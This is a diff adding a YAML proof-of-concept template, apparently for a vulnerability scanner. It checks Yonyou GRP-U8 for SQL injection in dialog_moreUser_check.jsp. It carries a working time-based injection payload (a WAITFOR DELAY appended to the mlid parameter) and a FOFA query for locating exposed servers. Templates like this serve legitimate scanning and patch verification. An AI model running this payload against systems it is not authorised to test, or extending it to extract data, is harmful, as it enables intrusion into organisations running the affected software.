@@ -1,0 +1,31 @@
+id: poc-yaml-yongyou-grp-u8-dialog-moreUser-check-sqli
+info:
+  name: 用友GRP-U8 dialog_moreUser_check SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /
+  expression: 'status_code == 200 &&
+
+    contains(body,"GRP-U8")
+
+    '
+- method: GET
+  path: /u8qx/dialog_moreUser_check.jsp?mlid=1';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    trim(body) == "0" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
